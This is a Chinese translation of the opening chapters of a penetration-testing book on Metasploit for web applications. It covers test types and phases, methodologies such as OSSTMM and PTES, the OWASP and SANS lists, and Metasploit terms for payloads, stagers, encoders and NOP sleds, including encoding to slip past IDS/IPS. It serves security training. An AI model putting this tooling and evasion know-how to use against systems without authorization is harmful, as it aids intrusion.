# Metasploit Web 渗透测试实用指南（一）

> 原文：[`annas-archive.org/md5/53B22D5EEA1E9D6C0B08A2FDA60AB7A5`](https://annas-archive.org/md5/53B22D5EEA1E9D6C0B08A2FDA60AB7A5)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 前言

在当今快速发展的技术世界中，安全行业的变化速度惊人，而涉及组织的网络攻击数量也在迅速增加。为了保护自己免受这些现实世界的攻击，许多公司引入了安全审计、风险和漏洞评估等流程管理，旨在帮助公司评估其业务资产的风险。为了保护这些资产，许多公司雇佣了安全专业人员，目的是识别公司应用程序和网络中的风险、漏洞和威胁。对于安全专业人员来说，建立自己的技能并熟悉最新的攻击方式至关重要。此外，为了提高效率，许多人在利用和枚举方面首选 Metasploit。

关于网络利用和后期利用，我们有许多资源可供利用，但在 Web 应用程序方面，很少有人选择 Metasploit。本书将帮助安全顾问和专业人士了解 Metasploit 在 Web 应用程序方面的另一面。它还将使读者能够在 Web 应用程序渗透测试项目中更有效地使用 Metasploit。

# 本书适合对象

本书旨在为渗透测试人员、道德黑客、安全顾问以及对 Web 应用程序渗透测试有一定了解并希望了解更多或深入研究 Metasploit 框架的人员设计。

# 本书涵盖内容

第一章《Web 应用程序渗透测试简介》涵盖了 Metasploit 的设置和安装，以及渗透测试生命周期、OWASP 前 10 名和 Sans 前 25 名等详细信息。

第二章《Metasploit 基础知识》解释了 Metasploit 的基础知识，从安装到利用。还涵盖了 Metasploit 的基本术语和其他不常用的选项。

第三章《Metasploit Web 界面》专注于 Metasploit Web GUI 界面的介绍，该界面可在 Metasploit 社区版中使用，然后再深入其他主题。

第四章《使用 Metasploit 进行侦察》涵盖了渗透测试生命周期中的第一个过程：侦察。从抓取横幅到 WEBDAV 侦察，将通过特定的 Metasploit 模块解释基本的侦察过程。

第五章《使用 Metasploit 进行 Web 应用程序枚举》专注于 Web 应用程序渗透测试中最重要的过程之一，即枚举。本章将从文件和目录枚举的基础知识开始，然后进入从网站爬取和抓取，以及涉及 Metasploit 模块的进一步枚举。

第六章《使用 WMAP 进行漏洞扫描》涵盖了 Metasploit 框架的 WMAP 模块，用于扫描 Web 应用程序。

第七章《使用 Metasploit 进行漏洞评估（Nessus）》涵盖了通过 Metasploit 利用 Nessus 漏洞扫描器进行目标漏洞评估扫描的过程。

第八章《CMS 漏洞测试-WordPress》涵盖了 WordPress 漏洞的枚举以及如何利用它们。

第九章《CMS 漏洞测试-Joomla》涵盖了 Joomla 漏洞的枚举以及如何利用它们。

第十章《CMS 漏洞测试-Drupal》涵盖了 Drupal 漏洞的枚举以及如何利用它们。

第十一章，*JBoss 上的渗透测试*，涵盖了枚举、利用和访问 JBoss 服务器的方法。

第十二章，*Apache Tomcat 上的渗透测试*，涵盖了枚举、利用和访问 Tomcat 服务器的方法。

第十三章，*Jenkins 上的渗透测试*，涵盖了枚举、利用和访问运行 Jenkins 服务器的方法。

第十四章，*逻辑漏洞挖掘-Web 应用模糊测试*，侧重于利用 Web 应用程序的业务逻辑中存在的缺陷。我们将深入介绍这些内容，以及模糊测试 Web 应用程序以识别漏洞的方法。

第十五章，*编写渗透测试报告*，介绍了报告撰写的基础知识以及如何使用不同的工具来自动化报告撰写过程。

# 充分利用本书

对 Metasploit Framework 和 Python 或 Ruby 等脚本语言的基本了解将有助于理解各章节。

| **书中涉及的软件/硬件** | **操作系统要求** |
| --- | --- |
| Metasploit Framework | Windows/macOS/*nix |

**如果您使用本书的数字版本，我们建议您自己输入代码。这样做将有助于避免与复制和粘贴代码相关的任何潜在错误。**

# 下载彩色图片

我们还提供了一个 PDF 文件，其中包含本书中使用的屏幕截图/图表的彩色图像。您可以在这里下载：[`www.packtpub.com/sites/default/files/downloads/9781789953527_ColorImages.pdf`](http://www.packtpub.com/sites/default/files/downloads/9781789953527_ColorImages.pdf)

# 使用的约定

本书中使用了许多文本约定。

`CodeInText`：表示文本中的代码词、数据库表名、文件夹名、文件名、文件扩展名、路径名、虚拟 URL、用户输入和 Twitter 句柄。这是一个例子："将下载的`WebStorm-10*.dmg`磁盘映像文件挂载为系统中的另一个磁盘。"

代码块设置如下：

```
html, body, #map {
 height: 100%; 
 margin: 0;
 padding: 0
}
```

当我们希望引起您对代码块的特定部分的注意时，相关行或项目将以粗体显示：

```
[default]
exten => s,1,Dial(Zap/1|30)
exten => s,2,Voicemail(u100)
exten => s,102,Voicemail(b100)
exten => i,1,Voicemail(s0)
```

任何命令行输入或输出都以以下形式书写：

```
$ mkdir css
$ cd css
```

**粗体**：表示一个新术语、一个重要单词或屏幕上看到的单词。例如，菜单或对话框中的单词会以这种形式出现在文本中。这是一个例子："从管理面板中选择系统信息。"

警告或重要说明会以这种形式出现。

提示和技巧会出现在这样的形式中。

# 免责声明

本书中的信息仅供以合乎道德的方式使用。如果您没有设备所有者的书面许可，请不要使用本书中的任何信息。如果您进行非法行为，您可能会被逮捕并依法起诉。如果您滥用本书中包含的任何信息，Packt Publishing 不承担任何责任。本书中的信息只能在获得适当人员的书面授权后在测试环境中使用。


# 第一章：介绍

本节讨论了 Web 应用程序测试的基础知识。然后，我们将继续讨论 Metasploit 的基础知识，然后深入研究 Metasploit 框架的 Web 界面。

本节包括以下章节：

+   第一章，*Web 应用程序渗透测试简介*

+   第二章，*Metasploit 基础*

+   第三章，*Metasploit Web 界面*


# 第二章：Web 应用程序渗透测试简介

在今天的世界中，有自动化工具和 SaaS 解决方案可以测试系统或应用程序的安全性。当应用程序需要测试业务逻辑漏洞时，自动化通常在逻辑层面失败。重要的是要了解渗透测试人员如何帮助组织在网络攻击之前保持一步，并且为什么组织需要遵循严格的补丁管理周期来保护他们的资产。

在本书中，您将学习如何使用著名的 Metasploit 框架对构建在不同平台上的 Web 应用程序进行渗透测试。由于我们大多数人都听说过这个工具及其在常规渗透测试中的重要性，本书将重点介绍如何使用 Metasploit 框架对各种 Web 应用程序进行渗透测试，如内容管理系统（CMS）和内容交付和内容集成系统（CD/CI）。要了解更多关于工具和技术的信息，我们首先需要了解渗透测试的基础知识。

在本章中，我们将涵盖以下主题：

+   什么是渗透测试？

+   渗透测试类型

+   渗透测试阶段

+   重要术语

+   渗透测试方法论

+   常见弱点枚举（CWE）

# 什么是渗透测试？

渗透测试，也称为 pen 测试，是对计算机系统进行的授权攻击，旨在评估系统/网络的安全性。测试旨在识别漏洞及其带来的风险。典型的渗透测试是一个五阶段的过程，识别目标系统、它们的漏洞以及每个漏洞的可利用性。目标是尽可能发现更多的漏洞，并以客户能够理解的普遍可接受的格式报告。让我们在下一节中看看不同类型的渗透测试。

# 渗透测试类型

根据客户的要求，渗透测试可以分为三种类型：

+   白盒

+   黑盒

+   灰盒

我们将在以下部分讨论每个阶段。

# 白盒渗透测试

白盒渗透测试，又称玻璃盒或透明盒渗透测试，是一种测试类型，其中客户完全共享有关目标系统、网络或应用程序的信息和细节，例如系统的登录凭据、网络设备的 SSH/Telnet 登录以及需要测试的应用程序源代码。由于从客户那里获取的关于他们的系统、网络或应用程序的信息非常敏感，建议您将所有信息以加密格式保存。

# 黑盒渗透测试

黑盒渗透测试是一种模拟攻击测试，渗透测试人员将扮演一个没有关于目标系统、网络或应用程序的内部信息的威胁行为者。这种类型的测试真正关注于渗透测试的第一阶段——侦察。渗透测试人员能够获取有关目标组织的信息越多，结果就会越好。在这种类型的测试中，渗透测试人员不会获得任何架构图、网络布局或任何源代码文件。

# 灰盒渗透测试

灰盒渗透测试是白盒和黑盒测试之间的中间点。在典型的灰盒测试中，渗透测试人员获得了一些关于应用程序、系统或网络的知识。由于其性质，这种类型的测试非常高效，并且更专注于有截止日期的组织。使用客户提供的信息，渗透测试人员可以专注于风险更大的系统，并节省大量时间进行自己的侦察。

现在我们清楚了可以进行的渗透测试类型，让我们看看渗透测试的阶段。

# 渗透测试阶段

为了更好地理解渗透测试，让我们来看看这个过程的各个阶段：

+   阶段 1：侦察

+   阶段 2：枚举

+   阶段 3：漏洞评估和分析

+   阶段 4：利用（包括利用后期）

+   阶段 5：报告

这可以在以下图表中看到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/34f2350e-4092-4606-83d9-57a2bb08e433.png)

每个阶段都有自己的一套工具和技术，可以用来高效地进行测试。

# 侦察和信息收集

侦察是进行渗透测试的第一个阶段。在这个阶段，渗透测试人员将尽力识别所涉及的系统或应用程序，并尽可能多地获取有关它的信息。这是测试的最关键阶段，因为这一步骤定义了攻击面。在白盒测试中，侦察可能并不重要，因为客户已经提供了有关范围内目标的所有信息。

黑盒测试在很大程度上依赖于这个阶段，因为测试人员没有得到任何信息。在 Web 应用程序渗透测试的情况下，我们将专注于识别 Web 应用程序使用的技术、域/子域信息、HTTP 协议侦察和枚举，以及任何其他可能帮助我们提高效率的细节。在这个阶段通常会定义目标和目标。

以下是可以用来对 Web 应用程序执行侦察的工具列表：

+   识别运行在非标准端口（用户自定义自定义端口）上的应用程序：Amap，Nmap 等

+   识别 DNS 和子域：dnsenum，dnsmap，dnswalk，dnsrecon，dnstracer，Fierce，dnscan，Sublist3r 等

+   识别技术平台：BlindElephant，Wappalyzer，WhatWeb 等

+   识别内容管理系统：WPScan，Joomscan，CMScan，Drupscan 等

现在，让我们来看看枚举。

# 枚举

在枚举阶段，前一个阶段（侦察）中识别的每个应用程序、系统或网络都将被扫描以寻找不同的攻击面，例如，在 Web 应用程序的情况下进行文件和目录枚举，在网络设备的情况下进行端口和服务枚举。这个阶段将帮助测试人员识别攻击向量。攻击向量是攻击者获取访问或渗透目标系统的路径或方法；在这种情况下，是渗透测试人员。最常用的攻击向量包括钓鱼邮件、恶意软件和未打补丁的漏洞。

渗透测试人员可以执行文件和目录枚举、HTTP 方法枚举、主机枚举和其他一些枚举方法，以找到可能存在漏洞的插入点。在白盒测试中，这个阶段并不真正起到重要作用，因为所有的信息和细节都已经提供给了测试人员，但这并不意味着你不应该进行这个阶段。即使所有的细节都已经提供，进行枚举和扫描也是一种良好的实践。这将帮助测试人员找到过时的攻击路径，这些攻击路径可能不受应用程序支持，但可能帮助测试人员渗透网络。

这个阶段对于黑盒测试和灰盒测试非常关键，因为通过对目标系统或应用程序进行侦察所检索到的所有信息都被渗透测试人员识别出来。如果手动进行枚举，这个过程可能会变得很繁琐，因此有一些公开可用的工具和一些 Metasploit 模块可以用来快速枚举应用程序。

以下是可以用来对 Web 应用程序执行枚举的工具列表：

+   文件和目录枚举：Dirsearch，dirb，dirbuster，Metasploit Framework，BurpSuite，gobuster 等

+   HTTP 协议支持的方法枚举：Nmap，BurpSuite，Metasploit Framework，wfuzz 等

+   **限制速率测试**：BurpSuite、ffuf、wfuzz 等

现在让我们来看看漏洞评估。

# 漏洞评估和分析

一旦我们确定了攻击向量，我们需要进行漏洞扫描，这发生在渗透测试的这个阶段。对 Web 应用程序进行漏洞评估，以识别网页、目录、HTTP 协议方法、HTTP 标头等的漏洞。扫描可以使用公开可用的工具或付费许可的工具进行。所有类型的测试——白盒、黑盒和灰盒——都严重依赖于这个阶段。

一旦进行了漏洞扫描，我们需要评估和分析找到的每个漏洞，然后过滤掉虚假阳性。过滤掉虚假阳性有助于渗透测试人员处理实际存在的漏洞，而不是因为时间延迟或扫描器错误而发现的漏洞。所有的漏洞过滤都发生在这个阶段。

以下是可以用于对 Web 应用程序进行漏洞评估和扫描的工具列表：

+   **系统和网络漏洞评估**：Nessus、OpenVAS 等

+   **Web 应用程序漏洞评估**：Nikto、Acunetix、BurpSuite、Nessus 等

# 利用

利用阶段是侦察阶段之后的第二个最关键的阶段。这个阶段证明了前一阶段发现的某个漏洞是否可利用。渗透测试人员可以通过利用发现的漏洞来确定渗透测试项目的成功。利用可以使用特定工具自动完成，例如 Metasploit Framework 和 Canvas。这是因为我们不知道某个 Web 应用程序或系统在使用有效载荷时会有怎样的行为。

通常，在所有类型的测试中，我们需要向客户确认是否被授权执行基于内存的利用，例如利用缓冲区/堆溢出和运行内存破坏利用。这样做的优势是，通过运行特定的利用，我们可以访问目标系统（只有在目标系统对这个特定的利用存在漏洞时才有效）。使用这种利用的问题是，系统/服务器/Web 应用程序可能会崩溃，这可能会导致业务连续性问题。

一旦我们利用了系统或 Web 应用程序，我们可以选择停止，或者（如果得到客户授权）进行利用后工作，以进入网络（枢纽）并找到业务关键服务器。

请确保所有有效载荷、Web shell、文件和脚本都上传到目标系统以进行利用，以便在拍摄适当的**概念证明**（**PoC**）截图后进行清理。这应该始终如此；否则，真正的攻击者可能会找到 Web shell 并轻松使用它们来攻击组织。

# 报告

报告阶段是渗透测试过程的最后阶段，涉及报告在目标（范围内）发现的每一个漏洞。报告的漏洞将根据**通用漏洞评分系统**（**CVSS**）定义的严重程度级别进行列出，这是一个用于评估漏洞的免费开放标准。

作为渗透测试人员，我们需要了解这个阶段对客户来说有多么重要。测试人员在客户系统上所做的所有工作都应该以结构化的格式报告。报告应包括测试的简短介绍、工作范围、参与规则、简短而简洁的摘要、发现的漏洞以及每个漏洞的概念证明，以及一些推荐和来自参考链接的修补技术。

有一些公开可用的工具，如 Serpico、Magic Tree、BurpSuite 和 Acunetix，可以用来简化报告过程。由于这是渗透测试的重要阶段，测试期间发现的所有细节都应包含在报告中。

我们可以提供两种不同类型的报告：一份供管理层使用的**执行报告**和一份供技术团队使用的**技术报告**。这可以帮助组织的管理层和技术团队了解并修复渗透测试人员发现的漏洞。

# 重要术语

既然我们熟悉了标准，现在让我们来介绍一下我们在接下来的章节中将经常使用的重要术语：

+   **漏洞**：系统中可能允许攻击者未经授权访问的弱点。

+   **欺骗**：一个个体或程序成功地将数据伪装成其他东西，以获取不法利益的情况。

+   **利用**：利用漏洞获取未经授权的系统/应用程序访问权限的代码片段、程序、方法或一系列命令。

+   **有效载荷**：在利用过程中/之后在系统上执行的实际代码，以执行所需的任务。

+   **风险**：任何可能影响数据的机密性、完整性和可用性的事物。未打补丁的软件、配置错误的服务器、不安全的互联网浏览习惯等都会增加风险。

+   **威胁**：任何可能对计算机系统、网络或应用程序造成严重危害的事物。

+   **黑盒**：测试方法，测试人员对系统的内部结构或功能没有任何信息。

+   **白盒**：测试方法，测试人员完全了解系统的内部结构和功能。

+   **漏洞赏金**：漏洞赏金计划是许多网站和开发者提供的一项协议，允许个人因报告漏洞而受到荣誉和奖励，特别是与利用和漏洞相关的漏洞。

+   **SAST**：**静态应用安全测试**（**SAST**）是一种依赖于检查应用程序源代码的安全测试形式。

+   **DAST**：**动态应用安全测试**（**DAST**）是一种用于检测应用程序在运行状态下的安全漏洞的技术。

+   **模糊测试**：一种自动化测试技术，将无效、意外或随机数据提供为应用程序的输入。

既然我们已经了解了这个重要的术语，让我们继续学习测试方法。

# 渗透测试方法

众所周知，没有明确定义的官方渗透测试标准；然而，我们的安全社区已经为所有安全人员引入了一些标准。一些常见的标准包括**开放源代码安全测试方法手册**（**OSSTMM**）、**渗透测试执行标准**（**PTES**）和**信息系统安全评估框架**（**ISSAF**）。它们大多遵循相同的方法，但它们的阶段名称不同。我们将在接下来的章节中逐个查看它们，并详细介绍 PTES。

# 开放源代码安全测试方法手册（OSSTMM）

OSSTMM 的定义在它们的官方网站上提到，网址为[`www.isecom.org/OSSTMM.3.pdf`](https://www.isecom.org/OSSTMM.3.pdf)：

这是一个经过同行评审的安全测试和分析手册，其结果是经过验证的事实。这些事实提供了可操作的信息，可以显著改善您的运营安全。

使用 OSSTMM，审计将提供对操作层面安全的精确估计，清除假设和不可靠的证据。它用于彻底的安全测试，并旨在保持一致和可重复。作为一个开源项目，它向所有安全测试人员开放，鼓励越来越准确、可操作和高效的安全测试。

OSSTMM 包括以下关键部分：

+   运营安全指标

+   信任分析

+   人员安全测试

+   物理安全测试

+   无线安全测试

+   电信安全测试

+   数据网络安全测试

+   合规法规

+   **安全测试审计报告**（STAR）的报告

# 运营安全指标

OSSTMM 的这一部分涉及需要保护的内容以及攻击面的暴露程度。这可以通过创建 RAV（攻击面的公正事实描述）来衡量。

# 信任分析

在运营安全中，信任是指在范围内目标之间的互动，可以被任何恶意人士利用。为了量化信任，我们需要理解并进行分析，以做出更加理性和合乎逻辑的决策。

# 人员安全测试

**人员安全**（HUMSEC）是**物理安全**（PHYSSEC）的一个子部分，包括**心理操作**（PSYOPS）。测试安全的这一方面需要与能够访问受保护资产的个人进行沟通，例如门卫。

# 物理安全测试

**物理安全**（PHYSSEC）指的是物理领域内的物质安全。测试这个通道需要与障碍物和人类（门卫）进行非沟通式互动。

# 无线安全测试

**频谱安全**（SPECSEC）是包括**电子安全**（ELSEC）、**信号安全**（SIGSEC）和**辐射安全**（EMSEC）的安全分类。测试这个通道需要分析师在目标附近。

# 电信安全测试

**电信安全**是 ELSEC 的一个子集，描述了组织在有线电信上的通信。测试这个通道涵盖了分析师和目标之间的互动。

# 数据网络安全测试

关于**数据网络安全**（通信安全[**COMSEC**]）方面的测试需要与能够访问用于控制对财产的访问的运营数据的个人进行互动。

# 合规法规

所需的合规性类型取决于所在地区和当前执政政府、行业和业务类型，以及支持的立法。简而言之，合规性是由立法或行业定义的一组通用政策，这些政策是强制性的。

# 使用 STAR 进行报告

**安全测试审计报告**（STAR）的目的是作为执行摘要，陈述在特定范围内测试的目标的攻击面。

# OSSTMM 测试类型

OSSTMM 根据测试者所知信息的多少将测试类型分为六大类：

+   **盲测**：在这种测试中，分析师对目标一无所知，但目标知道审计并拥有分析师的所有细节。这可以被视为对分析师知识的测试。

+   双盲测试：在这种测试中，分析师对目标、其防御、资产等一无所知。目标也不会被通知审计。这种测试用于检查分析师的知识和技能，以及目标对未知威胁的准备情况。这也被称为黑盒测试。

+   **灰盒**：在这个测试中，分析员对目标的防御措施了解有限，但对目标的资产和运作有完全的了解。目标方在这种情况下已经为审计做好了充分的准备，并且知道其全部细节。这个测试也被称为**漏洞测试**。

+   **双灰盒**：也被称为白盒测试。目标方对范围和时间有先进的了解，但对有效载荷和测试向量一无所知。

+   **串联**：也被称为内部审计或水晶球测试。在这个测试中，目标方和分析员都知道审计的全部细节，但这个测试不检查目标方对未知变量或向量的准备情况。

+   **逆向**：在这个测试中，攻击者全面了解目标的流程和运营安全，但目标方对审计何时以及如何进行一无所知。这也被称为红队演习。

这些类型在图中表示如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7cbe0d07-7c6c-4846-a8b5-9ddda23c776e.png)

来源：https://www.isecom.org/OSSTMM.3.pdf

许可：https://creativecommons.org/licenses/by/3.0/

现在我们已经阅读了不同的 OSSTMM 测试类型，让我们来看看 ISSAF。

# 信息系统安全评估框架（ISSAF）

ISSAF 并不是非常活跃，但他们提供的指南非常全面。它旨在评估信息安全政策以及组织对 IT 行业标准、法律和监管要求的遵守情况。当前版本的 ISSAF 是 0.2。

它涵盖了以下阶段：

+   项目管理

+   指南和最佳实践-预评估、评估和后评估

+   评估方法论

+   信息安全政策和安全组织审查

+   风险评估方法论评估

+   技术控制评估

+   技术控制评估-方法论

+   密码安全

+   密码破解策略

+   Unix /Linux 系统安全评估

+   Windows 系统安全评估

+   Novell netware 安全评估

+   数据库安全评估

+   无线安全评估

+   交换机安全评估

+   路由器安全评估

+   防火墙安全评估

+   入侵检测系统安全评估

+   VPN 安全评估

+   反病毒系统安全评估和管理策略

+   Web 应用安全评估

+   **存储区域网络**（**SAN**）安全

+   互联网用户安全

+   As 400 安全

+   源代码审计

+   二进制审计

+   社会工程

+   物理安全评估

+   事件分析

+   日志/监控和审计流程审查

+   业务连续性规划和灾难恢复

+   安全意识和培训

+   外包安全问题

+   知识库

+   安全评估项目的法律方面

+   **保密协议**（**NDA**）

+   安全评估合同

+   请求提案模板

+   桌面安全检查表-窗口

+   Linux 安全检查表

+   Solaris 操作系统安全检查表

+   默认端口-防火墙

+   默认端口-IDS/IPS

# 渗透测试执行标准（PTES）

这个标准是最广泛使用的标准，几乎涵盖了与渗透测试相关的一切。

PTES 分为七个阶段：

+   预先互动

+   情报收集

+   威胁建模

+   漏洞分析

+   利用

+   后期利用

+   报告

让我们简要了解一下每个阶段涉及的内容。

# 预先互动

预先互动是在活动开始之前进行的，比如定义活动的范围，通常涉及映射网络 IP、Web 应用程序、无线网络等。

一旦确定范围，就会建立供应商和事件报告流程之间的沟通渠道，并最终确定报告流程。这些互动还包括状态更新、电话、法律程序以及项目的开始和结束日期。

# 情报收集

情报收集是一个过程，用于收集有关目标的尽可能多的信息。这是渗透测试最关键的部分，因为我们拥有的信息越多，我们就可以使用更多的攻击向量来执行活动。在白盒活动的情况下，所有这些信息已经提供给测试团队。

# 威胁建模

威胁建模是一种识别和列举潜在威胁并对缓解措施进行优先排序的过程。威胁建模取决于收集的信息的数量和质量；有了这些信息，活动可以分解成阶段，然后使用自动化工具和逻辑攻击进行执行。

以下是威胁模型的思维导图：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/084e86a5-1f4f-40c5-a679-437d01a0d654.png)

（来源：[`www.pentest-standard.org/index.php/Threat_Modelling `](http://www.pentest-standard.org/index.php/Threat_Modelling)

许可证：[GNU 自由文档许可证 1.2](http://www.gnu.org/licenses/old-licenses/fdl-1.2.txt) ）

现在让我们来看一下漏洞分析。

# 漏洞分析

漏洞分析是发现攻击者可以利用的缺陷的过程。这些缺陷可以是从开放端口和服务配置错误到 SQL 注入的任何东西。有很多可用的工具可以帮助进行漏洞分析，例如 Nmap、Acunetix 和 Burp Suite。每隔几周就会发布新工具。

# 利用

利用是通过规避基于漏洞评估的保护机制来获得对系统的访问的过程。利用可以是公开的或零日的。

# 后期利用

后期利用是确定妥协的重要性，然后保持访问以供将来使用的阶段。这个阶段必须始终遵循保护客户和保护自己的规则（根据活动的要求覆盖踪迹）。

# 报告

报告是最重要的阶段之一，因为修补所有问题完全取决于报告中呈现的细节。报告必须包含三个关键元素：

+   漏洞的重要性

+   重现错误所需的步骤

+   补丁建议

总之，渗透测试生命周期阶段可以如下所示：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/40854475-a7b7-4ff9-b7a1-7559f670ffab.png)

在下一节中，我们将讨论通用弱点枚举（CWE）和两个顶级 CWE。

# 通用弱点枚举（CWE）

在本节中，我们将讨论**通用弱点枚举**（**CWE**）。CWE 是计算机软件中发现的弱点的通用在线词典。在本节中，我们将介绍两个著名的 CWE——OWASP 十大和 SANS 25 强。

# OWASP 十大

**开放式 Web 应用程序安全项目**（**OWASP**）是一个为计算机和互联网应用程序提供公正、实际和具有成本效益的信息的组织。

2020 年的当前列表包含以下错误：

+   注入

+   破损的身份验证

+   敏感数据暴露

+   **XML 外部实体**（**XXE**）

+   破损的访问控制

+   安全配置错误

+   **跨站脚本**（**XSS**）

+   不安全的反序列化

+   使用已知漏洞的组件

+   日志记录和监控不足

# SANS TOP 25

SANS 25 强列表是 SANS 研究所、MITRE 和美国和欧洲许多顶级软件安全专家之间的合作。它包括以下漏洞：

+   在网页生成期间未对特殊元素进行适当中和（'SQL 注入'）

+   在操作系统命令中未对特殊元素进行适当中和（'操作系统命令注入'）

+   在检查输入的大小时进行缓冲区复制（'经典缓冲区溢出'）

+   在网页生成期间未对输入进行适当中和（'跨站脚本'）

+   关键功能缺少身份验证

+   授权缺失

+   使用硬编码凭据

+   敏感数据加密缺失

+   不受限制地上传危险类型的文件

+   在安全决策中依赖不受信任的输入

+   以不必要的权限执行

+   **跨站请求伪造**（**CSRF**）

+   将路径名限制不当到受限目录（'路径遍历'）

+   在没有完整性检查的情况下下载代码

+   不正确的授权

+   包含来自不受信任控制领域的功能

+   对关键资源的权限分配不正确

+   使用潜在危险的函数

+   使用破损或风险的加密算法

+   缓冲区大小的错误计算

+   不正确限制过多的身份验证尝试

+   将 URL 重定向到不受信任的站点（'开放重定向'）

+   未受控制的格式字符串

+   整数溢出或环绕

+   使用不带盐的单向哈希

我们将在本书的后面章节详细介绍其中一些漏洞。

# 摘要

在本章中，我们从渗透测试及其类型和阶段的介绍开始。我们介绍了渗透测试方法和生命周期，并了解了一些重要术语。然后，我们看了 OWASP 十大和 SANS 二十五强。

在下一章中，我们将学习 Metasploit 的基本知识，包括 Metasploit 框架、安装和设置。

# 问题

1.  是否有一个维护**通用弱点枚举**（**CWE**）列表的数据库？

1.  我在哪里可以找到 OWASP 十大和 SANS 二十五强列表？

1.  执行渗透测试所需的工具是否免费？

1.  OSSTMM 和 PTES 基础的渗透测试有何不同？

# 进一步阅读

+   **安全和开放方法研究所**（**ISECOM**）：[`www.isecom.org/`](http://www.isecom.org/)

+   渗透测试标准网站：[`www.pentest-standard.org/index.php/Main_Page`](http://www.pentest-standard.org/index.php/Main_Page)


# 第三章：Metasploit 基础知识

Metasploit 项目是用于渗透测试和 IDS 签名捕获的工具。在这个项目下有 Metasploit Framework 子项目，它是开源和免费使用的。它具有针对目标开发和执行利用代码的能力。Metasploit 最初是由 H.D Moore 在 2003 年创建的，并于 2009 年被 Rapid7 收购。Metasploit Framework 是十年来最广泛使用的工具之一。无论您是在网络中执行适当的侦察还是进行后期利用，几乎所有的渗透测试都使用 Metasploit。

在本章中，我们将从介绍 Metasploit Framework 的基本术语开始，然后安装和设置 Metasploit 在不同平台上，以便学习如何使用一些基本命令与 Metasploit Framework 进行交互。

我们将在本章中涵盖以下主题：

+   Metasploit Framework 介绍

+   Metasploit Framework 术语

+   Metasploit 安装和设置

+   开始使用 Metasploit Framework

# 技术要求

以下是本章所需的技术要求：

+   Metasploit Framework v5.0.74 ([`github.com/rapid7/metasploit-framework`](https://github.com/rapid7/metasploit-framework))

+   基于*nix 系统或 Microsoft Windows 系统

+   Nmap

# Metasploit Framework 介绍

Metasploit 是我们在考虑渗透测试或利用时首先想到的工具。Metasploit Framework 是 Metasploit 项目的一个子项目。Metasploit 项目通过提供有关漏洞的信息以及帮助我们进行渗透测试来帮助我们。

Metasploit 首次出现在 2003 年。它是由 H.D Moore 使用 Perl 开发的，但后来在 2007 年转移到了 Ruby。到 2009 年 10 月，Rapid7 已经收购了 Metasploit 项目。然后 Rapid7 添加了 Metasploit Express 和 Metasploit Pro 的商业版本。这是 Metasploit Framework 演变的开始。

Metasploit Framework 是一个开源框架，允许我们编写、测试和执行利用代码。它也可以被认为是用于渗透测试和利用的一套工具。

在本章中，我们将介绍安装和使用 Metasploit Framework 的基础知识。

# Metasploit Framework 术语

现在，让我们来了解 Metasploit Framework 的基本术语。我们将在本书中经常使用这些术语，所以最好在深入研究**Metasploit Framework**（**MSF**）及其用法之前彻底理解它们：

+   **Exploits**：当 Metasploit 启动时，它显示了框架中已经可用的公开利用的数量。利用是利用漏洞并给出我们想要的输出的代码片段。

+   **Payload**：这是通过利用传递到目标系统或应用程序的代码片段，以执行我们选择的操作。有效载荷实际上可以分为三种主要类型：单个、分段和阶段：

+   **Singles**：这些有效载荷是独立的，通常用于执行简单的任务，比如打开`notepad.exe`文件和添加用户。

+   **Stagers**：这在两个系统之间建立连接。然后，它们将阶段下载到受害者的机器上。

+   **Stages**：这些可以被认为是有效载荷的组成部分。它们提供不同的功能，比如访问命令 shell、运行可执行文件以及上传和下载文件，并且不需要有大小限制。这种功能的一个例子是 Meterpreter。

其他类型的有效载荷如下：

+   +   **Inline (non-staged)**：包含完整 shellcode 的利用代码，用于执行特定任务。

+   **Staged**：这与阶段有效载荷一起工作，执行特定任务。分段器在攻击者和受害者之间建立通信通道，并发送一个将在远程主机上执行的分段有效载荷。

+   **Meterpreter**：这是*Meta Interpreter*的缩写，通过 DLL 注入运行。它加载在内存中，不留下磁盘上的痕迹。

+   **PassiveX**：这使用 ActiveX 控件创建 Internet Explorer 的隐藏实例。它通过 HTTP 请求和响应与攻击者通信。

+   **NoNX**：这用于绕过 DEP 保护。

+   **Ord**：这些是在所有版本的 Windows 上都可以工作的极小型有效载荷。但是，它们不稳定，并依赖于`ws2_32.dll`在利用过程中被加载。

+   **IPv6**：这是为 IPv6 主机设计的。

+   **Reflective DLL Injection**：由 Stephen Fewer 创建，这是一种技术，其中分段有效载荷被注入到运行在内存中的受损主机进程中，而从不触及主机硬盘。

+   **Auxiliary**：Metasploit 框架配备了数百个辅助模块，可用于执行不同的任务。这些模块可以被视为不利用任何东西的小工具。相反，它们在利用过程中帮助我们。

+   **Encoders**：编码器将信息（在这种情况下是汇编指令）转换为另一种形式，执行后将给我们相同的结果。编码器用于避免在传递到目标系统/应用程序时检测有效载荷。由于大多数在组织网络中配置的 IDS/IPS 都是基于签名的，因此在对有效载荷进行编码时，它将改变整个签名并轻松地绕过安全机制。最著名的编码器是`x86/shikata_ga_nai`。这是一种多态的 XOR 加反馈编码器，这意味着每次使用时都会生成不同的输出。它在首次推出时是最难检测到的。当与多次迭代一起使用时，它仍然非常有用。但是，必须小心使用迭代，并始终首先进行测试；它们可能不会按预期工作，并且随着每次迭代，有效载荷的大小都会增加。

+   **NOP 生成器**：NOP 生成器用于生成一系列随机字节，这些字节等同于传统的 NOP 滑梯，只是它们没有任何可预测的模式。NOP 滑梯也可以用于绕过标准的 IDS 和 IPS NOP 滑梯签名（`NOP Sled - \x90\x90\x90`）。

+   **Project**：这是一个容器，用于在渗透测试活动期间存储数据和凭据。在 Metasploit Pro 版本中更常用。

+   **Workspace**：工作区与项目相同，但仅在 Metasploit 框架中使用。

+   **Task**：这是我们在 Metasploit 中执行的任何操作。

+   **Listener**：监听器等待来自被攻击目标的传入连接，并管理连接的目标 shell。

+   **Shell**：Shell 是一个控制台，比如一个接口，它让我们可以访问远程目标。

+   **Meterpreter**：在官方网站上，Meterpreter 的定义如下：

